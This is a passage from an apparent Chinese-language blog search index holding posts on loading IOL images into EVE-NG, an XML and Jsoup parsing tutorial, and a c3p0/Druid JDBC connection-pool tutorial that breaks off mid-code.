命令修正镜像权限</p><p>上传IOL镜像<br>将文件全部上传到&#x2F;opt&#x2F;unetlab&#x2F;addons&#x2F;iol&#x2F;bin目录下（其中Python脚本和iourc文件是必须的）<br>使用脚本生成license值，然后替换iourc文件中的值<br>然后执行 &#x2F;opt&#x2F;unetlab&#x2F;wrappers&#x2F;unl_wrapper -a fixpermissions 命令修正镜像权限</p><p>上传镜像后登陆eve-ng会进行加载，进入后创建设备<br><img src="https://img.hacpai.com/file/2020/02/image-8dccb1d6.png" alt="image.png"><br>当设备点亮说明上传成功</p><p>QEMU的下载链接：<br>链接：<a href="http://pan.baidu.com/s/1kUOxPFD">http://pan.baidu.com/s/1kUOxPFD</a> 密码：3duh</p><p>Dynamips的下载链接：<br>链接：<a href="http://pan.baidu.com/s/1bpqyo1p">http://pan.baidu.com/s/1bpqyo1p</a> 密码：zxe1</p><p>IOL的下载链接：<br>链接：<a href="http://pan.baidu.com/s/1dE2psfn">http://pan.baidu.com/s/1dE2psfn</a> 密码：s1fi</p><p>镜像来源于EmulatedLab微信公众号</p>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> eve-ng </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XML入门</title>
      <link href="/posts/62356/"/>
      <url>/posts/62356/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h3><p>Extensible Markup Language 可扩展标记语言。主要用于存储数据。</p><p>基本语法</p><ol><li>xml文档的后缀名 .xml</li><li>xml第一行必须定义为文档声明</li><li>xml文档中有且仅有一个根标签</li><li>属性值必须使用引号引起来</li><li>标签必须正确关闭</li><li>xml标签名称区分大小写</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Persons</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Person</span> <span class="attr">number</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">age</span>&gt;</span>17<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Person</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Person</span> <span class="attr">number</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>李四<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">age</span>&gt;</span>18<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Person</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Persons</span>&gt;</span></span><br></pre></td></tr></table></figure><p>标签的命名规则</p><ul><li>名称可以包含字母、数字以及其他的字符 </li><li>名称不能以数字或者标点符号开始 </li><li>名称不能以字母 xml（或者 XML、Xml 等等）开始 </li><li>名称不能包含空格</li></ul><p>XML的特殊字符必须转义，通过CDATA可以保证数据原样输出。xml文档中的所有文本都会被解析器解析，只有CDATA区段中的文本会被解析器忽略。</p><ul><li>格式</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;![CDATA[</span><br><span class="line">原样输出的内容</span><br><span class="line"> ]]&gt;</span><br></pre></td></tr></table></figure><p>XML的约束：规定XML文的书写规则</p><ul><li>DTD（简单的约束）<ul><li><p>内部dtd ：将约束定义在XML文档中</p></li><li><p>外部dtd：将约束的规则定义在外部的dtd文件中<br><code>本地:&lt;!DOCTYPE 根标签名 SYSTEM &quot;dtd文件的位置&quot;&gt;</code><br><code>网络:&lt;!DOCTYPE 根标签名 PUBLIC &quot;dtd文件名字&quot; &quot;dtd文件的位置URL&quot;&gt;</code></p></li></ul></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> ?&gt;</span>   </span><br><span class="line"><span class="comment">&lt;!-- 内部 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">Persons</span> [   </span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ELEMENT <span class="keyword">Persons</span> (<span class="keyword">Person</span>*)&gt;</span>   </span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ELEMENT <span class="keyword">Person</span> (<span class="keyword">name</span>,<span class="keyword">age</span>)&gt;</span>   </span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ELEMENT <span class="keyword">name</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   </span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ELEMENT <span class="keyword">age</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   </span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ATTLIST <span class="keyword">Person</span> <span class="keyword">number</span> <span class="keyword">ID</span> <span class="keyword">#REQUIRED</span>&gt;</span>   </span></span><br><span class="line"><span class="meta"> ]&gt;</span>  </span><br></pre></td></tr></table></figure><ul><li>Schema（复杂的约束）</li></ul><p>Schenma 约束XML数据具体类型，存储数据的类型严格按照Schema约束，否则报错。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">students</span>   <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">           <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.stranger-info.top/xml  student.xsd&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">xmlns</span>=<span class="string">&quot;http://www.stranger-info.top/xml&quot;</span></span></span><br><span class="line"><span class="tag">  &gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">student</span> <span class="attr">number</span>=<span class="string">&quot;id_1&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">name</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">age</span>&gt;</span>18<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">sex</span>&gt;</span>男<span class="tag">&lt;/<span class="name">sex</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">student</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">students</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="解析XML"><a href="#解析XML" class="headerlink" title="解析XML"></a>解析XML</h3><p>操作XML文档，将文档中的数据读取到内存中，或者将内存中的数据写入保存到XML文档中，解析XML的方式主要有两种。</p><ul><li>DOM<br>一次性全部加载进内存，在内存中生成DOM树，所有内存消耗大，不适用内存小的设备，但是DOM操作方便。</li><li>SAX<br>SAX通过事件驱动，逐行读取，读取完一行之后，进行释放，然后读取下一行。所有SAX不占用多少内存，不能对数据进行操作。</li></ul><p>常见的XML解析器</p><ul><li>JAXP</li><li>DOM4J</li><li>Jsoup</li><li>PULL</li></ul><h3 id="Jsoup使用"><a href="#Jsoup使用" class="headerlink" title="Jsoup使用"></a>Jsoup使用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">//获取文档路径</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> JsoupDemo01.class.getClassLoader().getResource(<span class="string">&quot;hello.xml&quot;</span>).getPath();</span><br><span class="line">    <span class="comment">//解析文档 获取 Document对象</span></span><br><span class="line">    <span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> Jsoup.parse(<span class="keyword">new</span> <span class="title class_">File</span>(path), <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">    <span class="comment">//获取元素对象 </span></span><br><span class="line">    <span class="type">Elements</span> <span class="variable">elements</span> <span class="operator">=</span> document.getElementsByTag(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    <span class="comment">//获取第一个name的Element对象</span></span><br><span class="line">    <span class="type">Element</span> <span class="variable">element</span> <span class="operator">=</span> elements.get(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//获取数据</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> element.text();</span><br><span class="line">    System.out.println(text);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> Jsoup.parse (  )</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">parse(File in, String charsetName)：解析xml或html文件的。</span><br><span class="line">parse(String html)：解析xml或html字符串</span><br><span class="line">parse(URL url, int timeoutMillis)：通过网络路径获取指定的html或xml的文档对象</span><br></pre></td></tr></table></figure><p>Document 对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getElementById(String id)：根据id属性值获取唯一的element对象</span><br><span class="line">getElementsByTag(String tagName)：根据标签名称获取元素对象集合</span><br><span class="line">getElementsByAttribute(String key)：根据属性名称获取元素对象集合</span><br><span class="line">getElementsByAttributeValue(String key, String value)：根据对应的属性名和属性值获取元素对象集合</span><br></pre></td></tr></table></figure><p>Elements：元素Element对象的集合。可以当做 ArrayList<Element>来使用</p><p> Element 元素对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getElementById(String id)：根据id属性值获取唯一的element对象</span><br><span class="line">getElementsByTag(String tagName)：根据标签名称获取元素对象集合</span><br><span class="line">getElementsByAttribute(String key)：根据属性名称获取元素对象集合</span><br><span class="line">getElementsByAttributeValue(String key, String value)：根据对应的属性名和属性值获取元素对象集合</span><br><span class="line"></span><br><span class="line">String attr(String key)：根据属性名称获取属性值</span><br><span class="line"></span><br><span class="line">String text():获取文本内容</span><br><span class="line">String html():获取标签体的所有内容(包括字标签的字符串内容)</span><br></pre></td></tr></table></figure><h4 id="selector-选择器使用"><a href="#selector-选择器使用" class="headerlink" title="selector 选择器使用"></a>selector 选择器使用</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">persons</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">person</span> <span class="attr">number</span>=<span class="string">&quot;id_1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">age</span>&gt;</span>18<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">person</span> <span class="attr">number</span>=<span class="string">&quot;id_2&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>李四<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">age</span>&gt;</span>18<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">persons</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">//获取文档路径</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> JsoupDemo01.class.getClassLoader().getResource(<span class="string">&quot;hello.xml&quot;</span>).getPath();</span><br><span class="line">    <span class="comment">//解析文档 获取Document对象</span></span><br><span class="line">    <span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> Jsoup.parse(<span class="keyword">new</span> <span class="title class_">File</span>(path), <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">    <span class="comment">//获取Person标签并且number属性id_1的age子标签</span></span><br><span class="line">    <span class="type">Elements</span> <span class="variable">elements</span> <span class="operator">=</span> document.select(<span class="string">&quot;person[number=\&quot;id_1\&quot;]&gt;age&quot;</span>);</span><br><span class="line">    System.out.println(elements);</span><br><span class="line">    <span class="comment">/* 输出结果</span></span><br><span class="line"><span class="comment">    &lt;age&gt;</span></span><br><span class="line"><span class="comment">     17</span></span><br><span class="line"><span class="comment">    &lt;/age&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Xpath-选择器使用"><a href="#Xpath-选择器使用" class="headerlink" title="Xpath 选择器使用"></a>Xpath 选择器使用</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, XpathSyntaxErrorException &#123;</span><br><span class="line">    <span class="comment">//获取文档路径</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> JsoupDemo01.class.getClassLoader().getResource(<span class="string">&quot;hello.xml&quot;</span>).getPath();</span><br><span class="line">    <span class="comment">//解析文档 获取Document对象</span></span><br><span class="line">    <span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> Jsoup.parse(<span class="keyword">new</span> <span class="title class_">File</span>(path), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    <span class="comment">//创建JXDocument对象</span></span><br><span class="line">    JXDocument jxDocument=<span class="keyword">new</span> <span class="title class_">JXDocument</span>(document);</span><br><span class="line">    <span class="comment">//查询所有person标签下的name标签</span></span><br><span class="line">    List&lt;JXNode&gt; jxNodes = jxDocument.selN(<span class="string">&quot;//person/name&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(JXNode jxNode:jxNodes)&#123;</span><br><span class="line">        System.out.println(jxNode);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*输出结果</span></span><br><span class="line"><span class="comment">    &lt;name&gt;</span></span><br><span class="line"><span class="comment">    张三</span></span><br><span class="line"><span class="comment">    &lt;/name&gt;</span></span><br><span class="line"><span class="comment">    &lt;name&gt;</span></span><br><span class="line"><span class="comment">    李四</span></span><br><span class="line"><span class="comment">    &lt;/name&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>xpath : (“&#x2F;&#x2F;标签名[ @属性&#x3D; “属性值”]”）<br>具体查询参考文档</p><blockquote><p>注意：如果XML文档标签首字母大写，则Xpath解析时的标签名小写,例如<code>jxDocument.selN(&quot;//person&quot;)</code>中的person必须小写，否则输出为空。（问题）</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xml </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>连接池的基本使用</title>
      <link href="/posts/48462/"/>
      <url>/posts/48462/</url>
      
        <content type="html"><![CDATA[<h3 id="c3p0-的使用"><a href="#c3p0-的使用" class="headerlink" title="c3p0 的使用"></a>c3p0 的使用</h3><p>C3P0 是一个开源的 JDBC 连接池它实现了数据源和 JNDI 绑定，支持 JDBC3 规范和 JDBC2 的标准扩展。目前使用它的开源项目有<strong>Hibernate</strong>、<strong>Spring</strong>等。</p><h4 id="1、jar-包的导入"><a href="#1、jar-包的导入" class="headerlink" title="1、jar 包的导入"></a>1、jar 包的导入</h4><p><img src="https://img.hacpai.com/file/2019/11/c3p0jar%E5%8C%85-ca3c81a2.PNG" alt="c3p0jar 包.PNG"><br>前两个 jar 包是 c3p0 必须使用的包，最后一个包是 MySQL 连接驱动必须要使用的，只要是连接数据库都需要这个包。（只导入前两个连接数据库会失败）</p><h4 id="2、c3p0-config-xml-文件"><a href="#2、c3p0-config-xml-文件" class="headerlink" title="2、c3p0-config.xml 文件"></a>2、c3p0-config.xml 文件</h4><p>src 目录下建立 c3p0-config.xml 或者 c3p0.properties 文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">c3p0-config</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 使用默认的配置读取连接池对象 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">default-config</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--  连接参数 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClass&quot;</span>&gt;</span>com.mysql.jdbc.Driver<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;jdbcUrl&quot;</span>&gt;</span>jdbc:mysql://localhost:3306/test<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span>&gt;</span>root<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 连接池参数 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 初始化时的连接数量 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;initialPoolSize&quot;</span>&gt;</span>5<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 最大连接数量 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maxPoolSize&quot;</span>&gt;</span>10<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 超时时间 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;checkoutTimeout&quot;</span>&gt;</span>3000<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">default-config</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">named-config</span> <span class="attr">name</span>=<span class="string">&quot;otherc3p0&quot;</span>&gt;</span> </span><br><span class="line">    <span class="comment">&lt;!--  连接参数 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClass&quot;</span>&gt;</span>com.mysql.jdbc.Driver<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;jdbcUrl&quot;</span>&gt;</span>jdbc:mysql://localhost:3306/<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span>&gt;</span>root<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 连接池参数 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;initialPoolSize&quot;</span>&gt;</span>5<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maxPoolSize&quot;</span>&gt;</span>8<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;checkoutTimeout&quot;</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">named-config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">c3p0-config</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3、连接数据库"><a href="#3、连接数据库" class="headerlink" title="3、连接数据库"></a>3、连接数据库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws SQLException &#123;</span><br><span class="line">    //创建数据库连接对象</span><br><span class="line">    DataSource dataSource = new ComboPooledDataSource();</span><br><span class="line">    //获取连接对象</span><br><span class="line">    Connection connection = dataSource.getConnection();</span><br><span class="line">    //输出</span><br><span class="line">    System.out.println(connection);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Druid-的使用"><a href="#Druid-的使用" class="headerlink" title="Druid 的使用"></a>Druid 的使用</h3><p>DRUID 是阿里巴巴开源平台上一个数据库连接池实现，它结合了 C3P0、DBCP、PROXOOL 等 DB 池的优点，同时加入了日志监控，可以很好的监控 DB 池连接和 SQL 的执行情况。</p><h4 id="1、jar-包导入"><a href="#1、jar-包导入" class="headerlink" title="1、jar 包导入"></a>1、jar 包导入</h4><p><img src="https://img.hacpai.com/file/2019/11/druid%E5%AF%BC%E5%85%A5-8130aa4d.PNG" alt="druid 导入.PNG"></p><h4 id="2、定义配置文件"><a href="#2、定义配置文件" class="headerlink" title="2、定义配置文件"></a>2、定义配置文件</h4><ul><li>是<code>properties</code>形式的</li><li>可以叫任意名称，可以放在任意目录下</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">driverClassName=com.mysql.jdbc.Driver</span><br><span class="line">url=jdbc:mysql://localhost:3306/test</span><br><span class="line">username=root</span><br><span class="line">password=123456</span><br><span class="line">#初始化连接数</span><br><span class="line">initialSize=5</span><br><span class="line">#最大连接数</span><br><span class="line">maxActive=10</span><br><span class="line">#超时时间</span><br><span class="line">maxWait=3000</span><br></pre></td></tr></table></figure><h4 id="3、连接数据库-1"><a href="#3、连接数据库-1" class="headerlink" title="3、连接数据库"></a>3、连接数据库</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">//加载配置文件</span></span><br><span class="line">    <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">resourceAsStream</span> <span class="operator">=</span> DruidTest.class.getClassLoader().getResourceAsStream(<span class="string">&quot;druid.properties&quot;</span>);</span><br><span class="line">    properties.load(resourceAsStream);</span><br><span class="line">    <span class="comment">//获取连接池对象</span></span><br><span class="line">    <span class="type">DataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> DruidDataSourceFactory.createDataSource(properties);</span><br><span class="line">    <span class="comment">//获取连接</span></span><br><span class="line">    <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection();</span><br><span class="line">    System.out.println(connection);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4、JDBC-工具类的使用"><a href="#4、JDBC-工具类的使用" class="headerlink" title="4、JDBC 工具类的使用"></a>4、JDBC 工具类的使用</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 